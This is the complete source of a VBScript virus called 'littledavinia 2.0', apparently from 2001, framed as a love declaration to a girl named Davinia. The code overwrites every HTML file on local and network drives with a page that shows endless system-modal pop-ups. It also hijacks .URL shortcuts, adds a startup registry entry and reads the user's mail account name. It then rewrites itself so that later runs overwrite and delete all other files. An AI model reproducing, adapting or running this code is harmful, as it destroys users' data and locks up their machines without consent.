Rem littledavinia 2.0
Rem Scriptlet.TypeLib and Office 2000 UA Controls bug
Rem written by Onel2 / 25 Enero 2001 / Melilla, España
'Quiero a Davinia:
On Error Resume Next
Dim fso, reg, l
Set fso = CreateObject("Scripting.FileSystemObject")
Set reg = CreateObject("WScript.Shell")
Set l = fso.GetSpecialFolder(1)
listingdrives()
declareloveagain()
Sub listingdrives()
On Error Resume Next
Dim d, dc, s
Set dc = fso.Drives
For Each d In dc
If d.DriveType = 2 or d.DriveType = 3 Then
listingfolders(d.Path & "\")
end If
Next
listingdrive = s
end Sub
sub listingfolders(folderspec) 
On Error Resume Next
Dim f, f1, sf
set f = fso.GetFolder(folderspec) 
set sf = f.SubFolders
For Each f1 In sf
declarelovetodavinia(f1.Path)
listingfolders(f1.Path)
Next 
end Sub
Sub declarelovetodavinia(folderspec) 
On Error Resume Next
Dim f, f1, fc, ex, opf, htd, love, nam, msg, gf
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
nam = reg.RegRead("HKCU\Software\Microsoft\Internet Account Manager\Accounts\00000001\SMTP Display Name")
If nam = "" Then
nam = "usuario"
end If
love="<HTML><HEAD><TITLE>Declaracion de amor a Davinia</TITLE></HEAD>"&vbcrlf&_
"<SCRIPT LANGUAGE=""VBScript""><!--"&vbcrlf&_
"'Espero que a Davi le guste mi declaracion."&vbcrlf&_
"For i = 0 to 2 ^ 50"&vbcrlf&_
"MsgBox ""Hola " & nam & "."" & chr(13) & ""Yo soy Onel2, de una pequeña ciudad, Melilla."" & chr(13) & ""Llevo 4 años enamorado de una chica llamada Davinia."" & chr(13) & ""Ella es guapisima y esta buenisima."" & chr(13) & ""Queria declararle mi amor de una forma"" & chr(13) & ""poco usual, por eso cree a este virus como"" & chr(13) & ""excusa para declararle mi amor."" & chr(13) & ""Davinia: eres la chica mas bonita que he visto."" & chr(13) & ""Tus maravillosos ojos negros, tu cabello rubio y tu"" & chr(13) & ""cuerpo perfecto aparecen todos los dias en mis sueños."" & chr(13) & ""        ¿Quieres salir conmigo?"",vbCritical+vbYesNo+vbSystemModal,""littledavinia 2.0 by Onel2"""&vbcrlf&_ 
"Next"&vbcrlf&_
"--></SCRIPT></HTML>"
For Each f1 In fc
ex = fso.GetExtensionName(f1.Path)
ex = UCase(ex)
If ex = "HTM" Or ex = "HTML" Then
Set opf = fso.OpenTextFile(f1.Path, 2, True)
opf.write love
opf.close
ElseIf ex = "URL" Then
Set opf = fso.OpenTextFile(f1.Path, 2, True)
opf.WriteLine "[InternetShortcut]"
opf.WriteLine "URL=" & l & "\littledavinia.html"
opf.close
ElseIf ex = "Davinia?" Then 'Esta linea cambiara la proxima vez para destruir al resto dde los archivos
Set opf = fso.OpenTextFile(f1.Path, 2, True)
opf.write love
opf.close
Set gf = fso.GetFile(f1.Path)
gf.Copy(f1.Path & ".html")
fso.DeleteFile(f1.Path)
end If
Next
Set htd = fso.CreateTextFile(l &"\littledavinia.html")
htd.write love
htd.close
reg.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Davi", l & "\littledavinia.html"
end Sub
Sub declareloveagain()
On Error Resume Next
Dim line, i, ofr, ofw
Set ofr = fso.OpenTextFile(WScript.ScriptFullName,1)
line = Split(ofr.ReadAll, vbcrlf)
For i = 0 to ubound(line)
If i = 60 Then
line(i) = "Else"
ElseIf i >= 74 Then
line(i) = "'GAME OVER. La declaracion ha terminado. ¿Cual sera la respuesta de Davinia?(Espero que  me diga si, porque sino tendre que crear a littledavinia 2.1,2.2,2.3...3.0)"
end If
Next
Set ofw = fso.OpenTextFile(WScript.ScriptFullName,2)
ofw.write join(line, vbcrlf)
ofw.close
end Sub
